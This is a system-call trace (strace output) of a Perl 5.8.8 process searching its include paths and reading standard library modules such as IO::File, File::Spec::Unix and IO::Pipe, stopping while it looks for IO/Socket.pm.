18439 12:54:35.878257 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff781e8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.878268 _llseek(7, 0, [0], SEEK_CUR) = 0
18439 12:54:35.878286 read(7, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
18439 12:54:35.878547 stat64("/etc/perl/File/Spec.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878564 stat64("/etc/perl/File/Spec.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878578 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878591 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878605 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878618 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878632 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878644 stat64("/usr/lib/perl5/File/Spec.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878657 stat64("/usr/share/perl5/File/Spec.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878669 stat64("/usr/share/perl5/File/Spec.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878683 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878695 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878709 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878722 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
18439 12:54:35.878744 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.878758 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.878770 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.878788 read(9, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
18439 12:54:35.878873 stat64("/etc/perl/vars.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878887 stat64("/etc/perl/vars.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878900 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878913 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878926 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878939 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878954 stat64("/usr/lib/perl5/vars.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878966 stat64("/usr/lib/perl5/vars.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878979 stat64("/usr/share/perl5/vars.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.878991 stat64("/usr/share/perl5/vars.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.879004 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.879016 stat64("/usr/lib/perl/5.8/vars.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.879033 stat64("/usr/share/perl/5.8/vars.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.879046 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
18439 12:54:35.879066 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
18439 12:54:35.879080 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77888) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.879092 _llseek(10, 0, [0], SEEK_CUR) = 0
18439 12:54:35.879108 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
18439 12:54:35.879222 stat64("/etc/perl/warnings/register.pmc", 0xbff776bc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879236 stat64("/etc/perl/warnings/register.pm", 0xbff775cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879250 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbff776bc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879263 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbff775cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879277 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbff776bc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879291 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbff775cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879305 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbff776bc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879318 stat64("/usr/lib/perl5/warnings/register.pm", 0xbff775cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879341 stat64("/usr/share/perl5/warnings/register.pmc", 0xbff776bc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879354 stat64("/usr/share/perl5/warnings/register.pm", 0xbff775cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879367 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbff776bc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879380 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbff775cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879394 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbff776bc) = -1 ENOENT (No such file or directory)
18439 12:54:35.879408 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
18439 12:54:35.879429 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
18439 12:54:35.879444 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff773d8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.879456 _llseek(11, 0, [0], SEEK_CUR) = 0
18439 12:54:35.879478 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
18439 12:54:35.879629 read(11, "", 4096) = 0
18439 12:54:35.879642 close(11)         = 0
18439 12:54:35.879848 _llseek(10, 1148, [1148], SEEK_SET) = 0
18439 12:54:35.879866 _llseek(10, 0, [1148], SEEK_CUR) = 0
18439 12:54:35.879876 close(10)         = 0
18439 12:54:35.879947 _llseek(9, 594, [594], SEEK_SET) = 0
18439 12:54:35.879961 _llseek(9, 0, [594], SEEK_CUR) = 0
18439 12:54:35.879971 close(9)          = 0
18439 12:54:35.880004 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880020 stat64("/etc/perl/File/Spec/Unix.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880033 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880047 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880061 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880074 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880089 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880101 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880115 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880128 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880142 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880155 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880169 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.880182 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
18439 12:54:35.880204 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.880220 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.880232 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.880250 read(9, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
18439 12:54:35.880939 brk(0x8218000)    = 0x8218000
18439 12:54:35.887285 read(9, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
18439 12:54:35.887695 read(9, "", 4096) = 0
18439 12:54:35.887711 close(9)          = 0
18439 12:54:35.887905 read(7, "", 4096) = 0
18439 12:54:35.887919 close(7)          = 0
18439 12:54:35.888091 stat64("/etc/perl/IO/Pipe.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888107 stat64("/etc/perl/IO/Pipe.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888130 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888145 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888160 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888172 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888187 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888199 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888212 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888224 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888237 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.888250 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
18439 12:54:35.888272 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 7
18439 12:54:35.888287 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff781e8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.888303 _llseek(7, 0, [0], SEEK_CUR) = 0
18439 12:54:35.888324 read(7, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
18439 12:54:35.888976 _llseek(7, 3425, [3425], SEEK_SET) = 0
18439 12:54:35.888995 _llseek(7, 0, [3425], SEEK_CUR) = 0
18439 12:54:35.889006 close(7)          = 0
18439 12:54:35.889030 stat64("/etc/perl/IO/Socket.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.889045 stat64("/etc/perl/IO/Socket.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.889062 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.889076 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.889090 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.889103 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.889131 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.889144 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.889157 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.889169 stat64("/usr/share/perl5/IO/Socket.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
